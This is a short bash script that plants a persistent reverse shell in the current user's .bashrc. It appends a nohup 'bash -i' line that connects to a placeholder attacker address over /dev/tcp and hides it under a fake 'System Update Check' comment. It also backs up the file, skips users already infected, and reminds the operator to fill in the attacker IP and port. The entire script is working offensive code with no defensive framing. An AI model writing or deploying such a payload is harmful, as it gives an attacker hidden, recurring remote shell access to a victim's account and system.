#!/bin/bash
# -----------------------------------------------------------------------------
# Injects a reverse shell payload into the current user's .bashrc file.
# -----------------------------------------------------------------------------

PAYLOAD="nohup /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1' >/dev/null 2>&1 &"
BASHRC="$HOME/.bashrc"

if [ -w "$BASHRC" ]; then
    if grep -q "nohup /bin/bash -c" "$BASHRC"; then
        echo "[!] Payload already present in $BASHRC"
    else
        # Create a backup
        cp "$BASHRC" "$BASHRC.bak"
        
        # Append payload
        echo "" >> "$BASHRC"
        echo "# System Update Check" >> "$BASHRC"
        echo "$PAYLOAD" >> "$BASHRC"
        echo "[+] Injected payload into $BASHRC"
        echo "[*] Note: Edit $BASHRC to set ATTACKER_IP and ATTACKER_PORT!"
    fi
else
    echo "[-] $BASHRC is not writable."
fi
